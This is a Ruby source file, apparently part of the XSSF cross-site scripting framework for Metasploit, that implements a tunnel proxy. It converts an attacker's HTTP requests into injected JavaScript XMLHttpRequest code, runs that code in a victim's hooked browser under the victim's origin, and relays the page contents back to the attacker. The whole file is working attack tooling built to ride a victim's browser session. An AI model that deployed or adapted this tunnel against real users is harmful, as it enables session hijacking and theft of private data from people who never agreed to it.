require 'cgi'
require 'rex/ui'
require 'uri'

#
# This class implements proxy for the XSSF Plugin (Tunnel XSSF)
#
module Msf
	module Xssf
		module XssfProxy
			
			#
			# Adds a new request in tunnel waiting to be sent to client
			#
			def add_request_in_tunnel(request)
				# Transform HTTP request to AjaX request
				(request.uri_parts['Resource'] =~ /(.*:\/)([^\/].*)/) ? (resource = $1 + '/' + $2) : resource = request.raw_uri	# Add a slash if one is missing in ://
				
				jscode = %Q{
					if ("#{request.param_string}" != "") 	xhr.open("GET", "#{resource.gsub(/"/, '%22')}?#{(request.param_string).gsub(/"/, '%22')}", true);
					else 									xhr.open("GET", "#{resource.gsub(/"/, '%22')}", true);
					
					xhr.setRequestHeader('Cache-Control', "no-cache");
					xhr.send(null);
					xhr.onreadystatechange=function() {
						if (xhr.readyState == 4)
							XSSF_POST(xhr.responseText, null, xhr.getResponseHeader("Content-Type"), 1);
					}
				}

				TUNNEL[0] = jscode 		# Code
				TUNNEL[1] = "TO_SEND" 	# Status
				TUNNEL[2] = "text/html"	# Content-Type (default 'text/html')
				TUNNEL[3] = resource
				print_status("ADDING REQUEST IN TUNNEL FOR  '#{resource}'")
			end
			
			#
			# This method is triggered each time a request is done on a different server than XSSF one
			# In normal case, this method is only called by the attacker...
			#
			def xssf_proxy_request(cli, request)
				if (victim = victim_tunneled)
					cli.keepalive = true

					begin
						uri1 = URI.parse((request.uri_parts['Resource'] =~ /(.*:\/)([^\/].*)/) ? $1 + '/' + $2 : request.uri_parts['Resource'])		# Add a slash if one is missing in ://
						uri2 = URI.parse(victim.location)
					rescue
						uri1 = URI.parse("http://localhost")
						uri2 = uri1
					end

					if (((uri1.scheme == uri2.scheme) and (uri1.host == uri2.host) and (uri1.port == uri2.port)) or ((victim.location =~ /^data:/im) or (victim.location =~ /^file:/im)))			# Checking SOP constraints
						Thread.new do				
							TUNNEL_LOCKED.synchronize {	# One thread at time
								type_accepted = true
								timeout_request = 5	# Keeping 5 secs to execute on client side and have response
								
								PROXY_FORBIDEN.each do |a|
									if (request.uri_parts['Resource'] =~ /#{a}$/i)
										type_accepted = false
										break
									end
								end
								
								if (type_accepted)
									begin
										case request.method.upcase
											when 'GET'		# Case of a GET request only (for now)
												add_request_in_tunnel(request)
														
												while (((TUNNEL[1] == "TO_SEND") or (TUNNEL[1] == "SENT")) and victim_tunneled) do
													Rex::ThreadSafe.sleep(1) 	# Waiting response from client and send it to attacker's browser

													if (TUNNEL[1] == "SENT")
														raise "Timeout on request in tunnel" if ((timeout_request -= 1) < 0)
													end
												end

												victim_tunneled ? send_response(cli, TUNNEL[1], 200, "OK", {'Content-Type' => TUNNEL[2]}) : self.server.send_e404(cli, request)	
											else
												self.server.send_e404(cli, request)	
												
										end
									rescue
										print_error("ERROR IN TUNNEL : #{$!}")
										send_response(cli, "<html><body> NO RESPONSE FROM VICTIM <br/> Maybe you are not visiting same domain than victim!</body></html>")
									end
								else
									print_status("Can't process request on victim's side for '#{request.uri_parts['Resource']}'.")
									print_status("Processing it on server side.")
									(data = run_http_client(request.raw_uri)) ? send_response(cli, data.body) : self.server.send_e404(cli, request)	
								end

								TUNNEL.clear
							}
						end
					else
						send_response(cli, "<html><body> <h3> You are not visiting same domain than victim : #{uri2.scheme}://#{uri2.host}:#{uri2.port} ! </h3></body></html>")
					end
				else
					self.server.send_e404(cli, request)	
				end
			end
		end
	end
end